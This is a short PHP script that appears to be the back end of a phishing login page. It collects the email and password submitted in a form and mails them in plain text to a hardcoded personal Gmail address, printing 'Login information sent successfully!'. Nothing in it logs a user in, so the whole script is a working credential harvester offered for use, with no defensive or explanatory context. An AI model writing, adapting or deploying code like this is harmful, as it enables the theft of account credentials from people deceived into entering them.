<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "sahil.shareef2010@gmail.com";  // Replace with your email
    $subject = "New Login Information";
    
    // Collect form data
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // Prepare the email content
    $message = "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";
    
    // Email headers
    $headers = "From: no-reply@yourdomain.com";
    
    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Login information sent successfully!";
    } else {
        echo "Failed to send login information.";
    }
}
?>
